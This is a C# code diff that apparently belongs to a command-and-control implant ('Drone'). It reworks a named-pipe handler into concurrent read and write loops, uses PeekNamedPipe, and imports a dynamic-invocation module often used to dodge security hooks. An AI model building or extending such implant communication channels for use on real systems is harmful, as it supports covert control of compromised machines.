@@ -7,6 +7,7 @@ using System.Security.Principal;
 using System.Threading;
 using System.Threading.Tasks;
 
+using Drone.Invocation.DynamicInvoke;
 using Drone.Models;
 
 namespace Drone.Handlers
@@ -71,56 +72,79 @@ namespace Drone.Handlers
             }
         }
 
-        private async Task RunReadWriteLoop(Stream stream)
+        private async Task RunReadWriteLoop(PipeStream pipeStream)
         {
-            // put reads in a separate task
-            var t = Task.Run(async () =>
-            {
-                var inbound = await ReadFromStream(stream);
-                var envelopes = inbound.Deserialize<MessageEnvelope[]>();
-                
-                if (envelopes.Any())
-                    foreach (var envelope in envelopes)
-                        InboundQueue.Enqueue(envelope);
-
-            }, _tokenSource.Token);
+            // put reads and writes in separate tasks
             
-            // writes
-            while (!_tokenSource.IsCancellationRequested)
+            var readTask = Task.Run(async () =>
             {
-                if (OutboundQueue.IsEmpty)
+                while (!_tokenSource.IsCancellationRequested)
                 {
-                    await Task.Delay(1000);
-                    continue;
-                }
+                    var inbound = await ReadFromStream(pipeStream);
+                    
+                    if (inbound is null || inbound.Length == 0)
+                    {
+                        await Task.Delay(1000);
+                        continue;
+                    }
+                    
+                    var envelopes = inbound.Deserialize<MessageEnvelope[]>();
+                
+                    if (envelopes.Any())
+                        foreach (var envelope in envelopes)
+                            InboundQueue.Enqueue(envelope);
 
-                var outbound = GetOutboundQueue().ToArray();
-                var raw = outbound.Serialize();
-                await WriteToStream(stream, raw);
-            }
+                    await Task.Delay(1000);
+                }
+                
+            }, _tokenSource.Token);
+
+            var writeTask = Task.Run(async () =>
+            {
+                while (!_tokenSource.IsCancellationRequested)
+                {
+                    if (OutboundQueue.IsEmpty)
+                    {
+                        await Task.Delay(1000);
+                        continue;
+                    }
+
+                    var outbound = GetOutboundQueue().ToArray();
+                    var raw = outbound.Serialize();
+                    await WriteToStream(pipeStream, raw);
+                }
+                
+            }, _tokenSource.Token);
+
+            // block whilst tasks are running
+            await Task.WhenAll(readTask, writeTask);
         }
 
-        private async Task<byte[]> ReadFromStream(Stream stream)
+        private static async Task<byte[]> ReadFromStream(PipeStream pipeStream)
         {
-            using var ms = new MemoryStream();
-
-            var buf = new byte[1024];
-            int read;
+            var pipeHandle = pipeStream.SafePipeHandle.DangerousGetHandle();
             
+            using var ms = new MemoryStream();
+            
+            uint bytes = 0;
+
             do
             {
-                read = await stream.ReadAsync(buf, 0, buf.Length, _tokenSource.Token);
-                await ms.WriteAsync(buf, 0, read);
-                Array.Clear(buf, 0, buf.Length);
+                Win32.Kernel32.PeekNamedPipe(pipeHandle, ref bytes);
+                if (bytes == 0) break;
 
-            } while (read >= buf.Length);
+                var buf = new byte[bytes];
+                var read = await pipeStream.ReadAsync(buf, 0, (int)bytes);
+                await ms.WriteAsync(buf, 0, read);
+            }
+            while (bytes > 0);
 
             return ms.ToArray();
         }
 
-        private async Task WriteToStream(Stream stream, byte[] data)
+        private static async Task WriteToStream(PipeStream pipeStream, byte[] data)
         {
-            await stream.WriteAsync(data, 0, data.Length);
+            await pipeStream.WriteAsync(data, 0, data.Length);
         }
 
         public override void Stop()
